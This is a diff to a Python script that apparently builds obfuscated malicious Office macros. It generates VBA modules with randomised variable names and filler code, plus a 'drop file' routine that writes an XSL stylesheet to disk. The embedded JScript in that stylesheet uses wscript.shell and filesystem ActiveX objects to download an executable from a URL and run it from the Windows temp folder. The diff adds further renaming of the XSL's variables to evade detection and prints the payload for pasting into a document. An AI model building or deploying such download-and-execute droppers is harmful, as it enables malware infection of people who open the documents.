@@ -1,6 +1,9 @@
 import string
 import random
 import os
+import re
+
+my_payload_url = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
 
 vba_variables = dict()
 
@@ -169,7 +172,7 @@ mod_3 = mod_3 + '''Public Sub {}({} As String, {} As String)
 Dim {} As Object
 Set {} = CreateObject("Scripting.FileSystemObject")
 Dim {} As Object
-Set {} = ajT74.CreateTextFile({}, True, True)
+Set {} = {}.CreateTextFile({}, True, True)
 {}.Write {}
 {}.Close\r\n'''.format(
     vba_variables['DropFileFunctionName'],
@@ -179,6 +182,7 @@ Set {} = ajT74.CreateTextFile({}, True, True)
     vba_variables['DropFileFunction_FileSystemObject'],
     vba_variables['DropFileFunction_CreateTextFileObject'],
     vba_variables['DropFileFunction_CreateTextFileObject'],
+    vba_variables['DropFileFunction_FileSystemObject'],
     vba_variables['DropFileFunction_arg1'],
     vba_variables['DropFileFunction_CreateTextFileObject'],
     vba_variables['DropFileFunction_arg2'],
@@ -255,8 +259,8 @@ mod_4 = mod_4 + get_filler(1, 2)
 
 mod_4 = mod_4 + "Call {}({}, {})\r\n".format(
     vba_variables['DropFileFunctionName'],
-    vba_variables['DropFileFunction_arg1'],
-    vba_variables['DropFileFunction_arg2']
+    vba_variables['xsl_path'],
+    vba_variables['xsl_payload_text']
 )
 
 mod_4 = mod_4 + get_filler(13, 17)
@@ -296,21 +300,16 @@ mod_5 = mod_5 + "Public Sub test()\r\n\r\n"
 mod_5 = mod_5 + get_filler(2, 4)
 mod_5 = mod_5 + "End Sub\r\n"
 
-xsl_url_var = get_new_variable_name()
-xsl_url = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
-xsl_shell_obj_var = get_new_variable_name()
-xsl_filesystem_obj_var = get_new_variable_name()
-
-xsl_template = '''<?xml version='1.0'?>
+xsl_template_2 = '''<?xml version='1.0'?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
 	<msxsl:script language="JScript" implements-prefix="user">
 	<![CDATA[
 
 		// url
-		var {} = "{}";
+		var azlW9BJ7 = "$$MyPayloadUrl$$";
 
-		var {} = new ActiveXObject("wscript.shell");
-		var {} = new ActiveXObject("scripting.filesystemobject");
+		var a9ArS = new ActiveXObject("wscript.shell");
+		var aWhiR = new ActiveXObject("scripting.filesystemobject");
 
 		function axas5v9(a5OhCF)
 		{
@@ -361,12 +360,21 @@ xsl_template = '''<?xml version='1.0'?>
 <xsl:template match="/">
 <xsl:value-of select="user:aawg1('c:\\\\windows\\\\temp\\\\awMiOFl.exe')"/>
 </xsl:template>
-</xsl:stylesheet>'''.format(
-    xsl_url_var,
-    xsl_url,
-    xsl_shell_obj_var,
-    xsl_filesystem_obj_var
-)
+</xsl:stylesheet>'''
+
+random_var_pattern = re.compile(r'[\s\\\.\(\)]a[a-zA-Z0-9]{4,8}[\s\.\(\)]')
+regex_results = re.findall(random_var_pattern, xsl_template_2)
+xsl_variables = set()
+for i in regex_results:
+    varname = i
+    for c in ["\t", " ", "(", ")", ".", "\\"]:
+        varname = varname.replace(c, "")
+    xsl_variables.add(varname)
+
+for i in xsl_variables:
+    xsl_template_2 = xsl_template_2.replace(i, generate_variable_name())
+
+xsl_template_2 = xsl_template_2.replace("$$MyPayloadUrl$$", my_payload_url)
 
 if __name__ == "__main__":
     print("\r\nModule 1\r\n")
@@ -389,4 +397,11 @@ if __name__ == "__main__":
     print("-----")
     print(mod_4)
     print("-----")
-
+    print("\r\nModule 5\r\n")
+    print("Name of module: " + mod_5_name + "\r\n")
+    print("-----")
+    print(mod_5)
+    print("-----")
+    print("XSL for copy/paste into the multiline text box control:")
+    print("-----")
+    print(xsl_template_2)
